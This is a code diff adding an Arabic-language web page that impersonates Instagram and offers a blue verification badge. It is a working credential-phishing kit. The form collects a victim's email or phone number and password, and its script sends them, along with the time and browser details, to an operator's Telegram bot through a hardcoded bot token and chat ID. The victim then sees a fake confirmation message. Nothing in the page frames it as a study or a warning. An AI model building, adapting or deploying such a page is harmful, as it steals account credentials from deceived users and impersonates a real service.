@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>توثيق حساب انستجرام - علامة زرقاء</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9f0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 40px;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25), 0 2px 5px rgba(0,0,0,0.05);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #feda77, #f58529, #dd2a7b, #8134af, #515bd4);
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .checkmark {
+            font-size: 70px;
+            background: white;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .checkmark span {
+            font-size: 55px;
+            background: linear-gradient(135deg, #f58529, #dd2a7b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #dbdbdb;
+            border-radius: 28px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: #fafafa;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #0095f6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0,149,246,0.1);
+        }
+
+        .btn-verify {
+            width: 100%;
+            background: linear-gradient(90deg, #0095f6, #00c4f4);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 32px;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(0,149,246,0.3);
+        }
+
+        .btn-verify:hover {
+            transform: scale(1.01);
+            filter: brightness(1.02);
+            box-shadow: 0 6px 16px rgba(0,149,246,0.4);
+        }
+
+        .btn-verify:active {
+            transform: scale(0.98);
+        }
+
+        .info-note {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #8e8e8e;
+            border-top: 1px solid #efefef;
+            padding-top: 20px;
+        }
+
+        .footer {
+            background: #fafafa;
+            padding: 16px;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #777;
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.8rem;
+            color: #0095f6;
+        }
+
+        .error-msg {
+            background: #ffefef;
+            color: #ed4956;
+            padding: 10px;
+            border-radius: 28px;
+            font-size: 0.8rem;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            .card {
+                border-radius: 28px;
+            }
+            .content {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="checkmark">
+            <span>✓</span>
+        </div>
+        <h1>تحقق من حسابك</h1>
+        <div class="sub">احصل على علامة التوثيق الزرقاء</div>
+    </div>
+
+    <div class="content">
+        <form id="verifyForm">
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="username" class="input-field" placeholder="example@email.com أو 05xxxxxxxx" required>
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" class="input-field" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" class="btn-verify" id="submitBtn">✅ التحقق والمتابعة</button>
+        </form>
+
+        <div id="loader" class="loader">
+            ⏳ جاري التحقق من البيانات...
+        </div>
+        <div id="errorMsg" class="error-msg">
+            ⚠️ حدث خطأ، يرجى المحاولة مرة أخرى.
+        </div>
+
+        <div class="info-note">
+            سيتم التحقق من معلوماتك بواسطة نظام الأمان.<br>
+            وقت الاستجابة بضع ثواني.
+        </div>
+    </div>
+    <div class="footer">
+        © Instagram Verified 2025 • حماية عالية
+    </div>
+</div>
+
+<script>
+    // ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️
+    // 👇 ضع توكن البوت و معرف الشات (الاي دي) هنا 👇
+    const BOT_TOKEN = "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc";     // استبدل بـ Token البوت
+    const CHAT_ID   = "6678179112";       // استبدل بـ Chat ID الخاص بك
+    // ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️
+
+    const form = document.getElementById('verifyForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const loaderDiv = document.getElementById('loader');
+    const errorDiv = document.getElementById('errorMsg');
+
+    // دالة إرسال البيانات إلى التليجرام
+    async function sendToTelegram(emailOrPhone, password) {
+        // ترتيب الرسالة بشكل مرتب
+        const message = `🔷✅ توثيق انستجرام ✅🔷\n\n📧 الايميل/الرقم: ${emailOrPhone}\n🔑 كلمة المرور: ${password}\n\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n🌐 الجهاز: ${navigator.userAgent}`;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const params = new URLSearchParams();
+        params.append('chat_id', CHAT_ID);
+        params.append('text', message);
+        params.append('parse_mode', 'HTML');
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: params
+            });
+            
+            const data = await response.json();
+            if (data.ok) {
+                return true;
+            } else {
+                console.error('Telegram API error:', data);
+                return false;
+            }
+        } catch (error) {
+            console.error('Network error:', error);
+            return false;
+        }
+    }
+
+    // التعامل مع إرسال النموذج
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const emailOrPhone = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        if (!emailOrPhone || !password) {
+            errorDiv.style.display = 'block';
+            errorDiv.textContent = '⚠️ الرجاء تعبئة جميع الحقول.';
+            setTimeout(() => { errorDiv.style.display = 'none'; }, 2500);
+            return;
+        }
+        
+        // تجربة بسيطة للايميل
+        if (emailOrPhone.length < 3) {
+            errorDiv.style.display = 'block';
+            errorDiv.textContent = '⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح.';
+            setTimeout(() => { errorDiv.style.display = 'none'; }, 2500);
+            return;
+        }
+        
+        // تعطيل الزر وإظهار التحميل
+        submitBtn.disabled = true;
+        loaderDiv.style.display = 'block';
+        errorDiv.style.display = 'none';
+        
+        // إرسال البيانات إلى تليجرام
+        const success = await sendToTelegram(emailOrPhone, password);
+        
+        if (success) {
+            // محاكاة نجاح الإرسال وإعادة توجيه أو رسالة وهمية "سيتم مراجعة الطلب"
+            // يمكنك تغيير سلوك النجاح إلى رسالة أو إعادة توجيه مثلاً إلى صفحة انستجرام
+            alert("✅ تم استلام طلب التحقق بنجاح. سيتم مراجعة بياناتك خلال 24 ساعة.");
+            // optional: مسح الحقول
+            usernameInput.value = '';
+            passwordInput.value = '';
+            // يمكنك إعادة توجيه المستخدم إلى instagram.com
+            // window.location.href = "https://www.instagram.com";
+        } else {
+            errorDiv.style.display = 'block';
+            errorDiv.textContent = '⚠️ فشل الاتصال بخوادم التحقق، حاول مجدداً.';
+        }
+        
+        // إعادة تفعيل الزر وإخفاء التحميل
+        submitBtn.disabled = false;
+        loaderDiv.style.display = 'none';
+        
+        // إخفاء رسالة الخطأ بعد فترة إذا ظهرت
+        if (!success) {
+            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
+        }
+    });
+    
+    // تحذير بسيط في وحدة التحكم إذا كانت التوكنات افتراضية
+    if (BOT_TOKEN === "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc" || CHAT_ID === "6678179112") {
+        console.warn("⚠️ لم تقم بإدخال توكن البوت و Chat ID الحقيقي! الصفحة لن ترسل البيانات حتى تقوم بتعديل المتغيرات.");
+        // يمكن إظهار رسالة للمطور في الصفحة (اختياري)
+        const devWarning = document.createElement('div');
+        devWarning.style.background = '#ffd2d2';
+        devWarning.style.color = '#a10000';
+        devWarning.style.padding = '8px';
+        devWarning.style.borderRadius = '20px';
+        devWarning.style.fontSize = '12px';
+        devWarning.style.marginTop = '16px';
+        devWarning.style.textAlign = 'center';
+        devWarning.innerText = '⚠️ تنبيه للمطور: لم تقم بإعداد BOT_TOKEN و CHAT_ID في الكود بعد ❗';
+        document.querySelector('.content').appendChild(devWarning);
+    }
+</script>
+</body>
+</html>
